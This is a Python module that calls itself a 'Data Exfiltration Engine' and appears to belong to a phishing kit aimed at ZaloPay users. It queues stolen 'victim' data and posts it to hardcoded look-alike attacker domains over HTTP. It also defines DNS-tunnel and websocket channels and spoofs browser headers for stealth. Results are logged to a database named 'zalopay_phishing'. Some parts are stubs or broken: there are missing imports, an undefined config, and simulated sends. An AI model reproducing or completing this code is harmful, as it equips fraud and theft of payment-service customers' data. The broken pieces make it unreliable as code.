"""
Data Exfiltration Engine
Advanced data exfiltration with stealth and optimization
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import threading
import base64
import zlib

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ExfiltrationConfig:
    """Data exfiltration configuration"""

    def __init__(self):
        self.max_exfiltration_size = int(os.getenv("MAX_EXFILTRATION_SIZE", "10485760"))  # 10MB
        self.chunk_size = int(os.getenv("EXFILTRATION_CHUNK_SIZE", "8192"))
        self.exfiltration_delay = float(os.getenv("EXFILTRATION_DELAY", "1.0"))
        self.enable_compression = os.getenv("ENABLE_EXFILTRATION_COMPRESSION", "true").lower() == "true"
        self.enable_encryption = os.getenv("ENABLE_EXFILTRATION_ENCRYPTION", "true").lower() == "true"
        self.enable_stealth_mode = os.getenv("ENABLE_STEALTH_EXFILTRATION", "true").lower() == "true"
        self.max_concurrent_exfiltrations = int(os.getenv("MAX_CONCURRENT_EXFILTRATIONS", "5"))

class DataPacket:
    """Data exfiltration packet"""

    def __init__(self, packet_id: str, victim_id: str, data_type: str, data: Any,
                 priority: str = "normal", compression: bool = True, encryption: bool = True):
        self.packet_id = packet_id
        self.victim_id = victim_id
        self.data_type = data_type
        self.data = data
        self.priority = priority
        self.compression = compression
        self.encryption = encryption
        self.created_at = datetime.now(timezone.utc)

        # Processing status
        self.is_processed = False
        self.is_compressed = False
        self.is_encrypted = False
        self.is_sent = False
        self.processed_at = None
        self.sent_at = None

        # Packet metadata
        self.original_size = len(str(data).encode())
        self.processed_size = 0
        self.compression_ratio = 1.0
        self.transfer_time = 0.0

    def process_packet(self, compression: bool = True, encryption: bool = True) -> bool:
        """Process packet for exfiltration"""
        try:
            processed_data = self.data

            # Apply compression
            if compression and self.config.enable_compression:
                processed_data = self._compress_data(processed_data)
                self.is_compressed = True

            # Apply encryption
            if encryption and self.config.enable_encryption:
                processed_data = self._encrypt_data(processed_data)
                self.is_encrypted = True

            self.is_processed = True
            self.processed_at = datetime.now(timezone.utc)
            self.processed_size = len(str(processed_data).encode())

            # Calculate compression ratio
            if self.original_size > 0:
                self.compression_ratio = self.processed_size / self.original_size

            return True

        except Exception as e:
            logger.error(f"Error processing packet: {e}")
            return False

    def _compress_data(self, data: Any) -> Any:
        """Compress data"""
        try:
            data_str = json.dumps(data) if not isinstance(data, str) else data
            data_bytes = data_str.encode('utf-8')

            # Compress using zlib
            compressed_data = zlib.compress(data_bytes, level=6)
            compressed_str = base64.b64encode(compressed_data).decode('utf-8')

            return {
                "compressed": True,
                "original_size": len(data_bytes),
                "compressed_size": len(compressed_str),
                "data": compressed_str
            }

        except Exception as e:
            logger.error(f"Error compressing data: {e}")
            return data

    def _encrypt_data(self, data: Any) -> Any:
        """Encrypt data"""
        try:
            # In real implementation, use encryption manager
            # For now, simulate encryption
            return {
                "encrypted": True,
                "data": data
            }

        except Exception as e:
            logger.error(f"Error encrypting data: {e}")
            return data

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "packet_id": self.packet_id,
            "victim_id": self.victim_id,
            "data_type": self.data_type,
            "priority": self.priority,
            "created_at": self.created_at.isoformat(),
            "is_processed": self.is_processed,
            "is_compressed": self.is_compressed,
            "is_encrypted": self.is_encrypted,
            "is_sent": self.is_sent,
            "processed_at": self.processed_at.isoformat() if self.processed_at else None,
            "sent_at": self.sent_at.isoformat() if self.sent_at else None,
            "original_size": self.original_size,
            "processed_size": self.processed_size,
            "compression_ratio": self.compression_ratio,
            "transfer_time": self.transfer_time
        }

class ExfiltrationChannel:
    """Data exfiltration channel"""

    def __init__(self, channel_id: str, channel_type: str, endpoint: str,
                 capacity: int = 1000, is_stealth: bool = True):
        self.channel_id = channel_id
        self.channel_type = channel_type  # http, dns, icmp, websocket, etc.
        self.endpoint = endpoint
        self.capacity = capacity
        self.is_stealth = is_stealth
        self.created_at = datetime.now(timezone.utc)

        # Channel status
        self.is_active = True
        self.is_available = True
        self.current_load = 0
        self.total_transferred = 0
        self.error_count = 0

        # Performance metrics
        self.avg_transfer_speed = 0.0
        self.success_rate = 1.0

    def can_accept_packet(self, packet_size: int) -> bool:
        """Check if channel can accept packet"""
        return (self.is_active and self.is_available and
                self.current_load + packet_size <= self.capacity)

    def record_transfer(self, packet_size: int, success: bool, transfer_time: float):
        """Record packet transfer"""
        if success:
            self.current_load = max(0, self.current_load - packet_size)
            self.total_transferred += packet_size

            # Update average speed
            if self.avg_transfer_speed == 0:
                self.avg_transfer_speed = packet_size / transfer_time
            else:
                self.avg_transfer_speed = (self.avg_transfer_speed + packet_size / transfer_time) / 2
        else:
            self.error_count += 1

        # Update success rate
        total_attempts = self.total_transferred + self.error_count
        if total_attempts > 0:
            self.success_rate = self.total_transferred / total_attempts

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "channel_id": self.channel_id,
            "channel_type": self.channel_type,
            "endpoint": self.endpoint,
            "capacity": self.capacity,
            "is_stealth": self.is_stealth,
            "created_at": self.created_at.isoformat(),
            "is_active": self.is_active,
            "is_available": self.is_available,
            "current_load": self.current_load,
            "total_transferred": self.total_transferred,
            "error_count": self.error_count,
            "avg_transfer_speed": self.avg_transfer_speed,
            "success_rate": self.success_rate
        }

class DataExfiltrationEngine:
    """Advanced data exfiltration engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = ExfiltrationConfig()
        self.data_packets: Dict[str, DataPacket] = {}
        self.exfiltration_channels: Dict[str, ExfiltrationChannel] = {}
        self.exfiltration_queue: List[str] = []  # packet_ids in priority order

        # Initialize exfiltration channels
        self._initialize_exfiltration_channels()

        # Start exfiltration processor
        self._start_exfiltration_processor()

    def _initialize_exfiltration_channels(self):
        """Initialize exfiltration channels"""
        channels = [
            ExfiltrationChannel(
                "http_primary", "http", "https://exfil.zalopay-data.com/api/collect",
                capacity=10000, is_stealth=True
            ),
            ExfiltrationChannel(
                "http_backup", "http", "https://backup.zalopay-analytics.com/collect",
                capacity=5000, is_stealth=True
            ),
            ExfiltrationChannel(
                "dns_tunnel", "dns", "exfil.zalopay-dns.com",
                capacity=1000, is_stealth=True
            ),
            ExfiltrationChannel(
                "websocket_realtime", "websocket", "wss://realtime.zalopay-sync.com/ws",
                capacity=2000, is_stealth=True
            )
        ]

        for channel in channels:
            self.exfiltration_channels[channel.channel_id] = channel

        logger.info(f"Initialized {len(self.exfiltration_channels)} exfiltration channels")

    def _start_exfiltration_processor(self):
        """Start exfiltration processing thread"""
        processor_thread = threading.Thread(target=self._exfiltration_processor_loop, daemon=True)
        processor_thread.start()

    def _exfiltration_processor_loop(self):
        """Exfiltration processing loop"""
        while True:
            try:
                # Process pending packets
                if self.exfiltration_queue:
                    packet_id = self.exfiltration_queue.pop(0)
                    packet = self.data_packets.get(packet_id)

                    if packet and not packet.is_sent:
                        self._exfiltrate_packet(packet)

                time.sleep(0.1)  # Process every 100ms

            except Exception as e:
                logger.error(f"Error in exfiltration processor: {e}")
                time.sleep(1)

    def create_exfiltration_packet(self, victim_id: str, data_type: str, data: Any,
                                 priority: str = "normal") -> str:
        """Create data exfiltration packet"""
        try:
            packet_id = f"packet_{int(time.time())}_{secrets.token_hex(4)}"

            packet = DataPacket(
                packet_id=packet_id,
                victim_id=victim_id,
                data_type=data_type,
                data=data,
                priority=priority
            )

            self.data_packets[packet_id] = packet

            # Add to queue based on priority
            if priority == "critical":
                self.exfiltration_queue.insert(0, packet_id)
            else:
                self.exfiltration_queue.append(packet_id)

            logger.info(f"Exfiltration packet created: {packet_id} for victim: {victim_id}")
            return packet_id

        except Exception as e:
            logger.error(f"Error creating exfiltration packet: {e}")
            return ""

    def _exfiltrate_packet(self, packet: DataPacket):
        """Exfiltrate individual packet"""
        try:
            # Process packet
            if not packet.is_processed:
                packet.process_packet(self.config.enable_compression, self.config.enable_encryption)

            # Select optimal channel
            channel = self._select_optimal_channel(packet)
            if not channel:
                logger.error(f"No available channel for packet: {packet.packet_id}")
                return

            # Exfiltrate data
            start_time = time.time()
            success = self._send_packet_through_channel(packet, channel)
            transfer_time = time.time() - start_time

            # Record transfer
            channel.record_transfer(packet.processed_size, success, transfer_time)
            packet.is_sent = success
            packet.sent_at = datetime.now(timezone.utc)
            packet.transfer_time = transfer_time

            # Store result
            if self.mongodb:
                self._store_exfiltration_result(packet, channel, success)

            if success:
                logger.info(f"Packet exfiltrated successfully: {packet.packet_id}")
            else:
                logger.error(f"Packet exfiltration failed: {packet.packet_id}")

        except Exception as e:
            logger.error(f"Error exfiltrating packet: {e}")

    def _select_optimal_channel(self, packet: DataPacket) -> Optional[ExfiltrationChannel]:
        """Select optimal exfiltration channel"""
        try:
            available_channels = [
                channel for channel in self.exfiltration_channels.values()
                if channel.can_accept_packet(packet.processed_size)
            ]

            if not available_channels:
                return None

            # Select channel based on packet priority and channel performance
            if packet.priority == "critical":
                # Use fastest available channel
                return max(available_channels, key=lambda c: c.avg_transfer_speed)
            else:
                # Use most reliable channel
                return max(available_channels, key=lambda c: c.success_rate)

        except Exception as e:
            logger.error(f"Error selecting optimal channel: {e}")
            return None

    def _send_packet_through_channel(self, packet: DataPacket, channel: ExfiltrationChannel) -> bool:
        """Send packet through specific channel"""
        try:
            if channel.channel_type == "http":
                return self._send_http_packet(packet, channel)
            elif channel.channel_type == "dns":
                return self._send_dns_packet(packet, channel)
            elif channel.channel_type == "websocket":
                return self._send_websocket_packet(packet, channel)
            else:
                logger.error(f"Unsupported channel type: {channel.channel_type}")
                return False

        except Exception as e:
            logger.error(f"Error sending packet through channel: {e}")
            return False

    def _send_http_packet(self, packet: DataPacket, channel: ExfiltrationChannel) -> bool:
        """Send packet via HTTP channel"""
        try:
            # Prepare payload
            payload = {
                "packet_id": packet.packet_id,
                "victim_id": packet.victim_id,
                "data_type": packet.data_type,
                "timestamp": packet.created_at.isoformat(),
                "data": packet.data
            }

            # Add stealth headers
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br"
            }

            # Send request
            response = requests.post(
                channel.endpoint,
                json=payload,
                headers=headers,
                timeout=30
            )

            return response.status_code == 200

        except Exception as e:
            logger.error(f"Error sending HTTP packet: {e}")
            return False

    def _send_dns_packet(self, packet: DataPacket, channel: ExfiltrationChannel) -> bool:
        """Send packet via DNS tunnel"""
        try:
            # DNS tunneling implementation would go here
            # For now, simulate success
            return True

        except Exception as e:
            logger.error(f"Error sending DNS packet: {e}")
            return False

    def _send_websocket_packet(self, packet: DataPacket, channel: ExfiltrationChannel) -> bool:
        """Send packet via WebSocket channel"""
        try:
            # WebSocket exfiltration implementation would go here
            # For now, simulate success
            return True

        except Exception as e:
            logger.error(f"Error sending WebSocket packet: {e}")
            return False

    def exfiltrate_victim_data(self, victim_id: str, data: Dict[str, Any],
                              data_type: str = "intelligence", priority: str = "normal") -> Dict[str, Any]:
        """Exfiltrate victim data"""
        try:
            # Create packet
            packet_id = self.create_exfiltration_packet(victim_id, data_type, data, priority)

            if not packet_id:
                return {"success": False, "error": "Failed to create packet"}

            packet = self.data_packets[packet_id]

            # Wait for processing
            timeout = 30  # 30 seconds
            start_time = time.time()

            while not packet.is_sent and (time.time() - start_time) < timeout:
                time.sleep(0.1)

            if packet.is_sent:
                return {
                    "success": True,
                    "packet_id": packet_id,
                    "data_size": packet.processed_size,
                    "compression_ratio": packet.compression_ratio,
                    "transfer_time": packet.transfer_time
                }
            else:
                return {
                    "success": False,
                    "error": "Packet exfiltration timeout"
                }

        except Exception as e:
            logger.error(f"Error exfiltrating victim data: {e}")
            return {"success": False, "error": "Exfiltration failed"}

    def get_exfiltration_statistics(self) -> Dict[str, Any]:
        """Get exfiltration statistics"""
        try:
            total_packets = len(self.data_packets)
            sent_packets = len([p for p in self.data_packets.values() if p.is_sent])
            processed_packets = len([p for p in self.data_packets.values() if p.is_processed])

            # Calculate totals
            total_original_size = sum(p.original_size for p in self.data_packets.values())
            total_processed_size = sum(p.processed_size for p in self.data_packets.values())

            # Channel statistics
            channel_stats = {}
            for channel_id, channel in self.exfiltration_channels.items():
                channel_stats[channel_id] = {
                    "type": channel.channel_type,
                    "total_transferred": channel.total_transferred,
                    "error_count": channel.error_count,
                    "success_rate": channel.success_rate,
                    "avg_speed": channel.avg_transfer_speed
                }

            return {
                "total_packets": total_packets,
                "sent_packets": sent_packets,
                "processed_packets": processed_packets,
                "success_rate": sent_packets / total_packets if total_packets > 0 else 0,
                "total_original_size": total_original_size,
                "total_processed_size": total_processed_size,
                "compression_ratio": total_processed_size / total_original_size if total_original_size > 0 else 1.0,
                "queue_size": len(self.exfiltration_queue),
                "channel_stats": channel_stats,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting exfiltration statistics: {e}")
            return {"error": "Failed to get statistics"}

    def _store_exfiltration_result(self, packet: DataPacket, channel: ExfiltrationChannel, success: bool):
        """Store exfiltration result in database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            exfiltration_collection = db.data_exfiltration

            document = {
                "packet_id": packet.packet_id,
                "victim_id": packet.victim_id,
                "data_type": packet.data_type,
                "channel_id": channel.channel_id,
                "success": success,
                "original_size": packet.original_size,
                "processed_size": packet.processed_size,
                "compression_ratio": packet.compression_ratio,
                "transfer_time": packet.transfer_time,
                "created_at": packet.created_at,
                "sent_at": packet.sent_at,
                "expires_at": datetime.now(timezone.utc) + timedelta(days=7)  # Keep for 7 days
            }

            exfiltration_collection.insert_one(document)

        except Exception as e:
            logger.error(f"Error storing exfiltration result: {e}")

    def cleanup_old_packets(self, days_old: int = 7) -> int:
        """Clean up old packets"""
        try:
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_old)
            old_packets = []

            for packet_id, packet in self.data_packets.items():
                if packet.created_at < cutoff_date:
                    old_packets.append(packet_id)

            for packet_id in old_packets:
                del self.data_packets[packet_id]

                # Remove from queue if present
                if packet_id in self.exfiltration_queue:
                    self.exfiltration_queue.remove(packet_id)

            logger.info(f"Cleaned up {len(old_packets)} old packets")
            return len(old_packets)

        except Exception as e:
            logger.error(f"Error cleaning up old packets: {e}")
            return 0

# Global data exfiltration engine instance
data_exfiltration_engine = None

def initialize_data_exfiltration_engine(mongodb_connection=None, redis_client=None) -> DataExfiltrationEngine:
    """Initialize global data exfiltration engine"""
    global data_exfiltration_engine
    data_exfiltration_engine = DataExfiltrationEngine(mongodb_connection, redis_client)
    return data_exfiltration_engine

def get_data_exfiltration_engine() -> DataExfiltrationEngine:
    """Get global data exfiltration engine"""
    if data_exfiltration_engine is None:
        raise ValueError("Data exfiltration engine not initialized")
    return data_exfiltration_engine

# Convenience functions
def create_exfiltration_packet(victim_id: str, data_type: str, data: Any, priority: str = "normal") -> str:
    """Create exfiltration packet (global convenience function)"""
    return get_data_exfiltration_engine().create_exfiltration_packet(victim_id, data_type, data, priority)

def exfiltrate_victim_data(victim_id: str, data: Dict[str, Any], data_type: str = "intelligence",
                          priority: str = "normal") -> Dict[str, Any]:
    """Exfiltrate victim data (global convenience function)"""
    return get_data_exfiltration_engine().exfiltrate_victim_data(victim_id, data, data_type, priority)

def get_exfiltration_statistics() -> Dict[str, Any]:
    """Get exfiltration statistics (global convenience function)"""
    return get_data_exfiltration_engine().get_exfiltration_statistics()